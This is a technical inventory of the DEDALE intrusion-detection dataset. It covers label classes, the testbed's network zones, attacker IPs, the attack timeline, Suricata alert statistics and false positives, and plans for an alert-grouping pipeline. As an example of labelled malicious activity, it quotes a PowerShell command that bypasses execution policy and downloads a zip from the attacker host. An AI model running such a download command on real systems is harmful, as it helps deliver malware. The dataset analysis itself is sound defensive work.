# DEDALE — what the downloaded files actually contain (inspected 2026-10-11)

Data: `D:\agentsoc_data\dedale\` (outside the repo; CC BY 4.0, DOI 10.57745/Y5JLDG). All counts below come from read-only passes over the zips (nothing extracted). Calendar: weeks 1-2 benign (2024-12-23 .. 2025-01-05), attack in week 3 (8 days), dataset ends 2025-01-19.

## Ground truth from the DEDALE website (read 2026-10-11: dedale.inria.fr/download.html, /attack_scenario.html)

- **Label classes.** System logs: benign / class 1 "malicious logs (clearly linked to a malicious action)" / class 2 "malicious-related logs (consequences or dependent on how the attack step works)"; labelled from the known malicious processes and their sub-processes. Network (Zeek conn.log, per flow): 0 benign, 1 attack, 2 attack-related (not inherently malicious), plus MITRE tactic + technique and a description per malicious flow. Labelling scripts: gitlab.inria.fr/mlanvin/dedale_labeling.
- **Recommended use:** weeks 1-2 for training/calibration, weeks 3-4 for testing only.
- **Attacker infrastructure:** 172.19.1.1 (serves the meterpreter dropper), 172.19.2.1 (reverse shell), 172.19.0.2 (C2). Other 172.19.x addresses are simulated internet hosts (e.g. 172.19.0.4-13 send mail to 172.17.0.2), not the attacker.
- **Timeline (UTC as on the site):** 2025-01-06 10:00 email infection of client 2 (172.16.1.3); 01-08 15:00 lateral movement to client 1 (172.16.1.2) via PrintNightmare; 01-10 11:00 collection on the samba server / DC (172.16.0.2); 01-11 11:00 exfiltration to the attacker; 01-12..01-13 11:40 malware extinction and last beaconing; normal activity before 01-06 and from 01-14.
- The site also offers DFIR-ORC forensic artefacts for client_1..4, internal_server and dmz_server (not downloaded).

## Network architecture (source for the environment profile)

From the RESCOUSSE testbed page and diagram (dedale.inria.fr/rescousse.html, read 2026-10-11). This is the kind of knowledge a real enterprise has in its own CMDB / network plan.

| Zone (capture point) | Subnet | Hosts |
|:--|:--|:--|
| Internal (green_internal) | 172.16.1.0/24 | Internal company clients 1-N (Windows) = 172.16.1.2-.254 (client 1 = .2, client 2 = .3, consistent with the attack timeline); gateway 172.16.1.1 |
| Servers (orange_servers) | 172.16.0.0/24 | Internal Server 172.16.0.2 (samba / DC, holds domain credentials and documents), Log Server 172.16.0.3 (ELK; all Sysmon/auditd logs are sent here); gateway 172.16.0.1 |
| Company Router 2 | 172.16.255.0/24 | red0 172.16.255.2 |
| DMZ (orange_dmz) | 172.17.0.0/16 | DMZ Server 172.17.0.2 (mail + DVWA), Web Server 172.17.0.3 (WordPress), VPN Server 172.17.0.5 (VPN clients 10.8.0.0/16) |
| Internet (red zone) | 172.18.0.0/16 | Internet Router 172.18.0.1, External Router red0 172.18.0.3 |
| External | 172.19.0.0/16 | External clients 172.19.0.3-.102, external company clients (remote employees) 172.19.0.103-.202, SMTP server 172.19.0.254, external router 172.19.0.1 |

The diagram also marks the attacker addresses. Per design invariant I4 they are ground truth for the scorer and are **not** part of the profile; the profile only says "172.19.0.0/16 = external".

The current `network_model.is_internal_address()` (RFC 1918) would classify every one of these zones as internal, including the simulated internet and the external zone.

## Host labels (`system_logs_labels.zip`)

- **Positives only.** Each file is a list of malicious raw events (Elastic/ECS JSON as shipped by winlogbeat/auditbeat). There is no list of benign events and no alert objects; negatives would be "every other event" in the full winlogbeat/auditbeat logs (not downloaded).
- **Only three hosts are labelled:** CLIENT2 (8,440 events) and CLIENT1 (2,153) via winlogbeat; `internalserver` (5,190) via auditbeat (auditd), all on 2025-01-10.
- Class 1 ⊂ class 1+2 for both zones (clients: 9,566 of 10,593; server: 4,409 of 5,190). Class-2-only examples (e.g. `conhost.exe 0xffffffff -ForceV1`, image loads) fit the website's definition of class 2 (malicious-related consequences, see above).
- Client events by Sysmon event id: 11 FileCreate 6,639; 7 ImageLoad 2,922; 2 FileCreateTime 315; 10 ProcessAccess 141; 18 PipeConnected 123; 5 ProcessTerminate 122; 17 PipeCreated 122; **1 ProcessCreate 121**; 22 DNS 12; plus PowerShell 800/4103/600 (72). Only 195 of 10,593 carry `process.command_line`.
- Client events by day: 01-06 462, 01-07 195, **01-08 8,038**, 01-09 195, 01-10 837, 01-11 196, 01-12 195, 01-13 475.
- Example (CLIENT2, 2025-01-06T10:01:05Z): `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'http://172.19.1.1/Bank-of-Nuthington.zip' ...`; 2025-01-08 15:01: `C:\Users\client2\AppData\Local\Temp\svcmon.exe`.
- IPs seen in the labels: CLIENT2 = 172.16.1.3 (from the Suricata match below); internalserver contacted from 172.16.1.2.

## Suricata alerts (`suricata_alerts.zip`)

- 1,465,627 alerts, all four weeks, from two routers (companyrouter2 1,258,286; companyrouter 207,341). Format: syslog lines in Suricata's one-line text format (`[gid:sid:rev] signature [Classification] [Priority] {proto} src:port -> dst:port`), **no labels**, no EVE JSON, no flow id.
- Only **33 distinct signatures**. Three account for 88%: `ET INFO User-Agent (python-requests) Inbound to Webserver` 732,828; `ET USER_AGENTS Go HTTP Client User-Agent` 301,950; `ET TROJAN Suspicious POST With Reference to WINDOWS Folder Possible Malware Infection` 250,476. All fire at the same daily rate in the benign weeks (~62-68k per weekday, ~15k per weekend day).
- **88.5% of all alerts (1,297,618) are traffic to the Log Server 172.16.0.3**, on port 9200 (564,790) and port 50010 (732,828). By signature: python-requests UA 732,828 (all port 50010), Go HTTP client UA 301,950, "Suspicious POST With Reference to WINDOWS Folder" 250,476, "GPL EXPLOIT echo command attempt" 12,363, process-list POST 1. By source zone: internal clients 917,662, DMZ 258,791, router2 80,778, servers 40,387. The README says all host logs are sent to the Elastic log server, so the IDS is firing on the SIEM's own log shipping (log content contains Windows paths, process names and commands). The service on port 50010 is not documented. The remaining 168,009 alerts are mostly DNS-TLD and policy signatures.
- Only 4 signatures first appear after the benign weeks (6 alerts in total):
  - `ET INFO Dotted Quad Host ZIP Request` ×2, 2025-01-06 10:01, 172.16.1.3 -> 172.19.1.1:80 — **matches CLIENT2's labelled Invoke-WebRequest download** (both routers saw it).
  - `ET POLICY SMB Executable File Transfer` ×1, 2025-01-08 15:05, 172.16.1.3 -> 172.16.0.2:445 — within 5 min of 6,714 labelled CLIENT2 events (svcmon.exe).
  - `ET TROJAN Suspicious POST with Common Windows Process Names` ×1, 2025-01-06 08:10, from 172.16.1.15 — before the 10:00 infection, from a host the attack never touched: **false positive** (per the published timeline). Its destination is the Log Server, i.e. a client shipping its logs.
  - `ET TROJAN Backdoor family PCRat/Gh0st CnC traffic` ×2, 2025-01-08, from 172.16.1.30 and 172.16.1.6 to the DC's SMB port — hosts the attack never touched: **false positives** (per the published timeline).
- Alerts touching the attacker IPs (172.19.1.1 / 172.19.2.1 / 172.19.0.2): only the 2 ZIP-download copies. The C2 and reverse-shell traffic raised **no** Suricata alert.
- Ground truth for network data is in the Zeek `conn.log` labels (not downloaded); for Suricata alerts it can also be derived from the published timeline + attacker/victim IPs.

### Grouping (how many distinct cases the 1.47 M alerts are)

| Unit | Count |
|:--|--:|
| raw alerts (both routers) | 1,465,627 |
| after dropping the second router's copy (same sid + 5-tuple within 5 s) | 1,195,507 (weeks 1-2: 576,565; weeks 3-4: 618,942) |
| groups (signature, src, dst, hour) | 39,755 |
| groups (signature, src, dst, day) | 8,461 |
| groups (signature, src, dst), whole dataset | 1,042 |
| weeks 3-4 (signature, src, dst, day) groups | 4,413 |
| … of which the (signature, src, dst) was never seen in weeks 1-2 | **357** (289 distinct) |

The novel groups are mostly new external mail servers talking to 172.17.0.5 and new external IPs hitting clients — i.e. benign novelty — plus the attack's ZIP download.

## User behaviour (`userbehaviour_logs.zip`)

- 45 VMs × (`<ip>_<role>_ub.log`, `<ip>_<role>_timeline.csv`). The timeline is the benign activity plan: `ts, date_str, inter_event_delay, action_duration, action_type` (e.g. browsing, mailing). IPs here are on 192.168.56.0/24 (management network), not the 172.16.x addresses seen in Suricata.

## Syslog (`system_logs_syslog.zip`)

- 673 hourly `.jsonl.bz2` files. One hour (2025-01-08 00h) = 2,096 records: auditbeat 608, suricata 540 (the same alerts as above), filebeat 245, kernel 98, samba 96, postfix 160, dovecot 78, CRON 51, ovpn-server 41. Server-side Linux context, not alerts.

## Consequences for the converter

1. DEDALE does not ship labelled alerts. Alerts must be generated (e.g. Sigma rules over winlogbeat/auditbeat events) or taken from Suricata; labels must be joined from the event lists (host) or Zeek conn.log (network).
2. Host-level negatives and the benign-week baseline need the full winlogbeat log (27.1 GB compressed) — the labels alone give positives only.
3. Suricata alone is a realistic alert-fatigue stream but nearly blind to this APT (3 alerts match labelled activity out of 1.47 M); its benign weeks are a clean negative set, and 3 attack-window alerts are confirmed false positives.
4. LLM budget: the pipeline should run on groups, not raw alerts. With a benign-weeks baseline only ~357 group-days in weeks 3-4 are new; that is the scale of NCE calls, not 1.47 M.
